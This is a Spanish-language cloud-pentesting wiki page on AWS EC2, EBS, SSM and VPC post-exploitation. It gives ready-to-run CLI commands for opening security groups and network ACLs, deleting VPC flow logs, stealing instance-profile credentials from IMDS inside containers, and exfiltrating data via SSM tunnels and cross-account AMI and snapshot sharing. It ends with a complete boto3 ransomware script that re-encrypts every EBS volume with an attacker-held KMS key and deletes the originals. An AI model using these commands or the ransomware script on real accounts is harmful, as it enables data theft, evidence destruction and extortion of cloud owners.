# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Para más información consulta:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **duplica el tráfico entrante y saliente de las instancias EC2 dentro de una VPC** sin la necesidad de instalar nada en las propias instancias. Este tráfico duplicado normalmente se enviaría a algo como un sistema de detección de intrusiones de red (IDS) para su análisis y monitorización.\
Un atacante podría abusar de esto para capturar todo el tráfico y obtener información sensible del mismo:

Para más información consulta esta página:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copiar instancia en ejecución

Las instancias suelen contener algún tipo de información sensible. Hay diferentes formas de acceder (consulta [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Sin embargo, otra forma de comprobar su contenido es **crear una AMI y ejecutar una nueva instancia (incluso en tu propia cuenta) a partir de ella**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Los snapshots son copias de seguridad de volúmenes**, que usualmente contendrán **información sensible**, por lo que revisarlos debería revelar esta información.\
Si encuentras un **volume sin snapshot** podrías: **Crear un snapshot** y realizar las siguientes acciones o simplemente **montarlo en una instancia** dentro de la cuenta:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Exportar un EC2 AMI directamente a S3 usando `CreateStoreImageTask` para obtener una imagen de disco raw sin compartir snapshots. Esto permite forenseo offline completo o robo de datos mientras se deja la red de la instancia intacta.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Adjuntar un volumen io1/io2 Multi-Attach a una segunda instancia y montarlo en modo solo lectura para extraer datos en vivo sin snapshots. Útil cuando el volumen víctima ya tiene Multi-Attach habilitado dentro de la misma AZ.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Crear un EC2 Instance Connect Endpoint, autorizar ingress e inyectar claves SSH efímeras para acceder a instancias privadas a través de un túnel gestionado. Otorga rutas rápidas de movimiento lateral sin abrir puertos públicos.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Mover la secondary private IP de una ENI víctima a una ENI controlada por el atacante para suplantar hosts de confianza que están allowlisted por IP. Permite eludir ACLs internas o reglas SG basadas en direcciones específicas.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Reasociar un Elastic IP de la instancia víctima al atacante para interceptar tráfico inbound u originar conexiones outbound que parecen provenir de IPs públicas de confianza.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Si una regla de security group hace referencia a un customer-managed prefix list, agregar CIDRs del atacante a la lista expande silenciosamente el acceso a través de cada regla SG dependiente sin modificar el SG en sí.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Crear gateway o interface VPC endpoints para recuperar acceso outbound desde subnets aisladas. Aprovechar private links gestionados por AWS elude controles faltantes de IGW/NAT para exfiltración de datos.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

Un atacante con el permiso ec2:AuthorizeSecurityGroupIngress puede añadir reglas inbound a security groups (por ejemplo, permitiendo tcp:80 desde 0.0.0.0/0), exponiendo así servicios internos a Internet pública o a redes no autorizadas.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
Un atacante con permisos ec2:ReplaceNetworkAclEntry (o similares) puede modificar los Network ACLs (NACLs) de una subnet para volverlos muy permisivos —por ejemplo permitiendo 0.0.0.0/0 en puertos críticos— exponiendo todo el rango de la subnet al Internet o a segmentos de red no autorizados. A diferencia de Security Groups, que se aplican por instancia, los NACLs se aplican a nivel de subnet, por lo que cambiar un NACL restrictivo puede tener un radio de impacto mucho mayor al habilitar acceso a muchos más hosts.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

Un atacante con permisos ec2:Delete* e iam:Remove* puede eliminar recursos y configuraciones críticas de la infraestructura — por ejemplo key pairs, launch templates/versions, AMIs/snapshots, volumes or attachments, security groups or rules, ENIs/network endpoints, route tables, gateways, or managed endpoints. Esto puede causar una interrupción inmediata del servicio, pérdida de datos y pérdida de evidencia forense.

Un ejemplo es eliminar un security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

Apunta VPC Flow Logs a un bucket S3 controlado por el atacante para recopilar de forma continua metadatos de red (source/destination, ports) fuera de la cuenta víctima para reconocimiento a largo plazo.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Incluso si bloqueas un EC2 para que no pueda salir tráfico, todavía puede **exfil via DNS**.

- **VPC Flow Logs no registrarán esto**.
- No tienes acceso a los logs DNS de AWS.
- Desactívalo estableciendo "enableDnsSupport" en false con:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Un atacante podría llamar a endpoints API de una cuenta que él controla. Cloudtrail registrará estas llamadas y el atacante podrá ver los datos exfiltrados en los logs de Cloudtrail.

### Open Security Group

Podrías obtener mayor acceso a servicios de red abriendo puertos así:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Es posible ejecutar una instancia EC2 y registrarla para que se use para ejecutar instancias ECS y luego robar los datos de las instancias ECS.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### ECS-on-EC2 IMDS Abuse & ECS Agent Impersonation

Un compromiso dentro de cualquier ECS task que se ejecute en una EC2 container instance suele ser suficiente para pivotar al rol del host y a los IAM roles asociados con todas las demás tasks en ese nodo. Debido a que existe **no task isolation para ECS-on-EC2**, cada task puede consultar el EC2 Instance Metadata Service (IMDS) por defecto, robar el instance profile de la container instance y luego hablar el mismo protocolo WebSocket que usa el ECS agent con el control plane (la primitiva **ECScape**) para solicitar las credenciales de cada task actualmente programada en ese host. Latacora documentó este flujo en su [ECS-on-EC2 IMDS research](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/), que el siguiente resumen ofensivo condensa.

#### Cadena de ataque

1. **Roba el instance profile desde dentro del contenedor.** Asume que IMDSv2 es requerido, así que solicita un token y luego obtén el profile.

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{InstanceProfileName}
```
2. **Usa el container instance role para suplantar al ECS agent.** Con esas credenciales puedes hablar por el canal WebSocket no documentado que usa el ECS agent; el control plane te confía como el agente real y entrega **all task IAM credentials** a tu proceso. Ahora puedes ejecutar tasks con mayores privilegios localmente, volcar secrets del environment de las tasks, o actualizar services/tasks para redeploy workloads que puedas inspeccionar completamente.

#### IMDS reachability with IMDSv2 + hop limit 1

Configurar IMDSv2 con `HttpTokens=required` y `HttpPutResponseHopLimit=1` solo bloquea tasks que viven detrás de un salto extra (Docker bridge). Otros modos de red permanecen dentro de un salto del Nitro controller y aún reciben respuestas:

| ECS network mode | IMDS reachable? | Reason |
| --- | --- | --- |
| `awsvpc` | ✅ | Each task gets its own ENI that is still one hop away from IMDS, so tokens and metadata responses arrive successfully. |
| `host` | ✅ | Tasks share the host namespace, so they see the same hop distance as the EC2 instance. |
| `bridge` | ❌ | Responses die on the Docker bridge because that extra hop exhausts the hop limit. |

Por lo tanto, **nunca asumas que hop limit 1 protege las workloads en awsvpc o host-mode**—siempre prueba desde dentro de tus contenedores.

#### Detecting IMDS blocks per network mode

- **awsvpc tasks:** Security groups, NACLs, o ajustes de enrutamiento no pueden bloquear la dirección link-local 169.254.169.254 porque Nitro la inyecta en el host. Check `/etc/ecs/ecs.config` for `ECS_AWSVPC_BLOCK_IMDS=true`. Si la flag falta (por defecto) puedes curl IMDS directamente desde la task. Si está establecida, pivota al host/agent namespace para revertirla o ejecuta tus herramientas fuera de awsvpc.

- **bridge mode:** Cuando las requests de metadata fallan aunque hop limit 1 esté configurado, los defensores probablemente insertaron una regla DROP en `DOCKER-USER` como `--in-interface docker+ --destination 169.254.169.254/32 --jump DROP`. Listar `iptables -S DOCKER-USER` la expone, y el acceso root te permite borrar o reordenar la regla antes de consultar IMDS.

- **host mode:** Inspecciona la configuración del agent por `ECS_ENABLE_TASK_IAM_ROLE_NETWORK_HOST=false`. Esa configuración elimina los task IAM roles por completo, por lo que debes re-habilitarla, mover a awsvpc tasks, o robar credenciales a través de otro proceso en el host. Cuando el valor es `true` (por defecto), cada proceso en host-mode —incluyendo contenedores comprometidos— puede acceder a IMDS a menos que filtros personalizados eBPF/cgroup apunten a `169.254.169.254`; busca programas tc/eBPF o reglas iptables que hagan referencia a esa dirección.

Latacora incluso publicó [Terraform validation code](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening) que puedes desplegar en una cuenta objetivo para enumerar qué modos de red aún exponen metadata y planear tu siguiente hop en consecuencia.

Una vez entiendas qué modos exponen IMDS puedes planear tu post-exploitation path: apuntar a cualquier ECS task, solicitar el instance profile, suplantar al agent, y recolectar cada otro task role para movimiento lateral o persistencia dentro del cluster.

### Eliminar VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### Reenvío de puertos SSM

Permisos requeridos:

- `ssm:StartSession`

Además de la ejecución de comandos, SSM permite el tunelizado de tráfico, lo cual puede abusarse para pivot desde instancias EC2 que no tienen acceso de red debido a Security Groups o NACLs.
Uno de los escenarios donde esto es útil es pivotear desde un [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) hacia un EKS cluster privado.

> Para iniciar una sesión necesitas tener instalado el SessionManagerPlugin: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Instala el SessionManagerPlugin en tu máquina
2. Inicia sesión en la Bastion EC2 usando el siguiente comando:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Obtén las credenciales temporales de AWS del Bastion EC2 con el [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) script
4. Transfiere las credenciales a tu propia máquina en el archivo `$HOME/.aws/credentials` como perfil `[bastion-ec2]`
5. Inicia sesión en EKS como el Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Actualice el campo `server` en el archivo `$HOME/.kube/config` para que apunte a `https://localhost`
7. Cree un túnel SSM como sigue:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. El tráfico de la herramienta `kubectl` ahora se reenvía a través del túnel SSM vía la Bastion EC2 y puedes acceder al cluster privado de EKS desde tu propia máquina ejecutando:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Ten en cuenta que las conexiones SSL fallarán a menos que establezcas el flag `--insecure-skip-tls-verify ` (o su equivalente en herramientas de auditoría K8s). Dado que el tráfico se tuneliza a través del túnel seguro de AWS SSM, estás a salvo de cualquier tipo de ataques MitM.

Finalmente, esta técnica no es específica para atacar clusters EKS privados. Puedes configurar dominios y puertos arbitrarios para pivotar a cualquier otro servicio de AWS o a una aplicación personalizada.

---

#### Reenvío rápido Local ↔️ Remoto de Puertos (AWS-StartPortForwardingSession)

Si solo necesitas reenviar **un puerto TCP desde la instancia EC2 a tu host local** puedes usar el documento SSM `AWS-StartPortForwardingSession` (no se requiere el parámetro de host remoto):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
El comando establece un túnel bidireccional entre tu estación de trabajo (`localPortNumber`) y el puerto seleccionado (`portNumber`) en la instancia **sin abrir ninguna regla inbound de Security-Group**.

Casos de uso comunes:

* **File exfiltration**
1. En la instancia, inicia un HTTP server rápido que apunte al directorio que quieres exfiltrate:

```bash
python3 -m http.server 8000
```

2. Desde tu estación de trabajo, recupera los archivos a través del SSM tunnel:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Acceso a aplicaciones web internas (p. ej. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Consejo: Comprime y cifra la evidencia antes de exfiltrating it para que CloudTrail no registre el contenido en texto claro:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Compartir AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Buscar información sensible en AMIs públicas y privadas

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel es una herramienta diseñada para **buscar información sensible dentro de Amazon Machine Images (AMIs) públicas o privadas**. Automatiza el proceso de lanzar instancias desde las AMIs objetivo, montar sus volúmenes y escanear en busca de posibles secretos o datos sensibles.

### Compartir snapshot de EBS
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Una prueba de concepto similar a la demostración de Ransomware mostrada en las notas de post-exploitation de S3. KMS debería renombrarse a RMS (Ransomware Management Service) por lo sencillo que es usarlo para cifrar diversos servicios de AWS.

Primero, desde una cuenta AWS de 'attacker', crea una customer managed key en KMS. Para este ejemplo dejaremos que AWS gestione los datos de la key, pero en un escenario realista un actor malicioso retendría los datos de la key fuera del control de AWS. Modifica la key policy para permitir que cualquier AWS account Principal use la key. En esta key policy, el nombre de la cuenta era 'AttackSim' y la regla de la policy que permite acceso total se llama 'Outside Encryption'.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
La regla de la key policy necesita lo siguiente habilitado para permitir su uso para cifrar un volumen EBS:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Now with the publicly accessible key to use. We can use a 'victim' account that has some EC2 instances spun up with unencrypted EBS volumes attached. This 'victim' account's EBS volumes are what we're targeting for encryption, this attack is under the assumed breach of a high-privilege AWS account.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Similar al ejemplo de ransomware en S3. Este ataque creará copias de los volúmenes EBS adjuntos usando snapshots, usará la key públicamente disponible de la cuenta 'attacker' para cifrar los nuevos volúmenes EBS, luego desacoplará los volúmenes EBS originales de las instancias EC2 y los borrará, y finalmente eliminará los snapshots usados para crear los nuevos volúmenes EBS cifrados. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Esto resulta en que solo queden volúmenes EBS cifrados disponibles en la cuenta.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

También es importante notar que el script detuvo las instancias EC2 para desacoplar y borrar los volúmenes EBS originales. Los volúmenes originales sin cifrar ya no existen.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

A continuación, vuelve a la key policy en la cuenta 'attacker' y elimina la regla de 'Outside Encryption' de la key policy.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Espere un momento para que la nueva política de key configurada se propague. Luego vuelva a la cuenta 'victim' e intente adjuntar uno de los volúmenes EBS recién encriptados. Verá que puede adjuntar el volumen.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Pero cuando intente arrancar la instancia EC2 con el volumen EBS encriptado, simplemente fallará y pasará del estado 'pending' al estado 'stopped' de forma indefinida, ya que el volumen EBS adjunto no puede ser desencriptado usando la key porque la política de la key ya no lo permite.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Este es el script de python utilizado. Toma credenciales de AWS para una cuenta 'victim' y un valor de AWS ARN públicamente disponible para la key que se usará para la encriptación. El script hará copias encriptadas de TODOS los volúmenes EBS disponibles adjuntos a TODAS las instancias EC2 en la cuenta AWS objetivo, luego detendrá cada instancia EC2, desconectará los volúmenes EBS originales, los eliminará y, finalmente, eliminará todos los snapshots utilizados durante el proceso. Esto dejará sólo volúmenes EBS encriptados en la cuenta 'victim' objetivo. UTILICE ESTE SCRIPT SOLO EN UN ENTORNO DE PRUEBAS, ES DESTRUCTIVO Y ELIMINARÁ TODOS LOS VOLUMENES EBS ORIGINALES. Puede recuperarlos usando la KMS key utilizada y restaurarlos a su estado original mediante snapshots, pero quiero que tenga en cuenta que, al final del día, esto es un ransomware PoC.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Referencias

- [Latacora - ECS on EC2: Covering Gaps in IMDS Hardening](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/)
- [Latacora ecs-on-ec2-gaps-in-imds-hardening Terraform repo](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening)
- [Pentest Partners – How to transfer files in AWS using SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
